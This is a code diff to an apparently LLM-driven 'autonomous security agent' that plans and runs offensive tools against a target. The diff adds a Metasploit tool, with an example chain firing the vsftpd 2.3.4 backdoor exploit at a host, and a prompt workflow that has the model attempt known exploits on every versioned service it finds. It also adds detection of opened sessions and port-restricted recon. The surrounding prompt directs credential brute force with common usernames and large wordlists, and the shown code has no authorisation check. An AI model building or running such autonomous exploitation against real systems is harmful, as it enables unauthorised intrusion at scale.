@@ -48,6 +48,11 @@ with no target/url/filename etc. will simply fail):
 - run_katana: target, depth (default "3")
 - run_ffuf: url, wordlist (same guidance as run_gobuster above), param (default "FUZZ")
 - run_httpx: target, flags
+- run_metasploit: commands (raw msfconsole commands, separated by "; ", e.g.
+  "search vsftpd 2.3.4; use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS
+  10.0.0.5; set RPORT 21; run"). Use "search <keyword>" first if you don't
+  already know the exact module path -- its output tells you the real path
+  to "use".
 
 HYDRA SERVICE NAMES - use EXACTLY these:
 - FTP: "ftp"
@@ -64,7 +69,17 @@ HYDRA WORDLISTS - use these in order of speed:
 - Medium: "/usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt"
 - Full: "/usr/share/wordlists/rockyou.txt" — ONLY use if fast and medium lists fail, and only for high-value services like SSH and FTP. NEVER use on telnet or slow protocols.
 
-SEARCHSPLOIT: always use "keyword" param with service name only e.g. "vsftpd 2.3.4"
+CVE / KNOWN-EXPLOIT WORKFLOW: whenever recon (nmap -sV) identifies a
+service name AND version string, that is a strong signal to check for known
+vulnerabilities before trying blind credential brute force:
+  1. run_searchsploit with "keyword" = "<service> <version>" e.g. "vsftpd 2.3.4"
+  2. If a real, specific matching exploit appears in the results (or you
+     already know the module path), follow up with run_metasploit to
+     actually attempt it -- searchsploit only tells you an exploit exists,
+     it does not run anything itself.
+This applies to every service with a detected version, not just unusual
+ones -- do this before or alongside credential brute force, not instead of
+picking a real tool.
 
 CREDENTIAL TOOLS (hydra, medusa, ncrack): if no specific username is known,
 guess common defaults such as "root", "admin", "administrator" -- never leave
@@ -83,6 +98,9 @@ progress. Pick a REAL exploitation/enumeration tool based on the port:
 - Anything unrecognized: run_searchsploit with the service/version string
   from recon, or run_command to interact with it directly (e.g. curl-style
   probes) -- but still make an actual attempt, not another scan.
+- Any port with a detected service+version: also consider run_searchsploit
+  then run_metasploit per the CVE/KNOWN-EXPLOIT WORKFLOW below -- this is
+  often more direct than credential brute force.
 
 Respond with a tool chain using each tool's REAL parameter names from the list
 above, e.g.: {"chain": [{"tool": "run_nmap", "target": "10.0.0.5", "flags": "-sV"}]}
@@ -151,6 +169,11 @@ def _detect_exploit_success(tool, output):
     if tool == "run_sqlmap":
         lowered = output.lower()
         return "is vulnerable" in lowered or "the back-end dbms is" in lowered
+    if tool == "run_metasploit":
+        # A session actually opening is msfconsole's own definitive
+        # "it worked" signal -- an exploit that merely "completed" without
+        # opening a session is not a landed exploit.
+        return bool(re.search(r"session\s+\d+\s+opened", output, re.IGNORECASE))
     return False
 
 
@@ -319,17 +342,50 @@ def execute_step(step):
         return "", False
 
 
-def run_recon(target, memory):
+# Common UDP-only services -- nmap's default scan (TCP-only) reports these
+# as "closed" even when they're genuinely up, since it never actually probes
+# UDP. Ports scoped here get a proper -sU pass alongside the TCP ports.
+UDP_PORTS = {"53", "69", "123", "161", "500", "514", "1900"}
+
+
+def run_recon(target, memory, ports=None):
     log.info(f"[SCAN] Starting recon on {target}")
+    if ports:
+        # Deterministic path, no model call: when the operator already knows
+        # which ports/services they want examined, build the scan directly
+        # instead of asking the model to transcribe a port list into tool
+        # params -- confirmed unreliable in practice (the model has
+        # hallucinated/dropped values in far simpler single-field cases).
+        # This is also faster: skips a full 1-65535 masscan sweep.
+        log.info(f"[SCAN] Restricting recon to explicit port list: {ports}")
+        port_list = [p.strip() for p in ports.split(",") if p.strip()]
+        udp_list = [p for p in port_list if p in UDP_PORTS]
+        tcp_list = [p for p in port_list if p not in UDP_PORTS]
+        if udp_list and tcp_list:
+            flags = f"-sV -sT -sU -p T:{','.join(tcp_list)},U:{','.join(udp_list)}"
+        elif udp_list:
+            flags = f"-sV -sU -p {','.join(udp_list)}"
+        else:
+            flags = f"-sV -p {','.join(tcp_list)}"
+        output, ok = execute_step({"tool": "run_nmap", "target": target, "flags": flags})
+        if output:
+            found = extract_ports(output)
+            if found:
+                memory.add_ports(found)
+                log.info(f"[SCAN] 🎉😄 Found {len(found)} open ports: {found}")
+            else:
+                log.warning("[SCAN] 😤💀 No ports found in output")
+        return
+
     goal = f"Scan {target} with masscan then nmap to find all open ports and services."
     data = call_model(goal)
     for step in data.get("chain", []):
         output, ok = execute_step(step)
         if output:
-            ports = extract_ports(output)
-            if ports:
-                memory.add_ports(ports)
-                log.info(f"[SCAN] 🎉😄 Found {len(ports)} open ports: {ports}")
+            found = extract_ports(output)
+            if found:
+                memory.add_ports(found)
+                log.info(f"[SCAN] 🎉😄 Found {len(found)} open ports: {found}")
             else:
                 log.warning("[SCAN] 😤💀 No ports found in output")
 
@@ -375,11 +431,11 @@ def run_attack_loop(target, memory, cache=None):
         log.warning("[FAIL] 😤💀 No successful breaches this session")
 
 
-def run_full_engagement(target):
+def run_full_engagement(target, ports=None):
     memory = AgentMemory()
     cache = NegativeCache()
     log.info(f"[ENGAGE] 💣 Full engagement started on {target}")
-    run_recon(target, memory)
+    run_recon(target, memory, ports=ports)
     if memory.open_ports:
         run_attack_loop(target, memory, cache)
     else:
@@ -406,9 +462,13 @@ def main():
     print("⚔️   AUTONOMOUS SECURITY AGENT")
     print("=" * 60)
     print("Commands:")
-    print("  engage <target>  - full recon + attack loop")
-    print("  <any goal>       - single model query")
-    print("  exit             - quit")
+    print("  engage <target> [ports]  - full recon + attack loop")
+    print("                             ports: optional comma-separated list")
+    print("                             (e.g. 21,53,80,81,82,2222,3306) to")
+    print("                             restrict recon instead of a full")
+    print("                             1-65535 sweep")
+    print("  <any goal>               - single model query")
+    print("  exit                     - quit")
     print(f"  📝 Session log: {log_file}")
     print("=" * 60)
 
@@ -422,8 +482,10 @@ def main():
                 continue
             log.info(f"[GOAL] 🎯 {goal}")
             if goal.startswith("engage "):
-                target = goal.replace("engage ", "").strip()
-                run_full_engagement(target)
+                parts = goal.replace("engage ", "").strip().split()
+                target = parts[0]
+                ports = parts[1] if len(parts) > 1 else None
+                run_full_engagement(target, ports=ports)
                 log.info("[REPORT] 📝 Engagement complete — generating report")
             else:
                 data = call_model(goal)
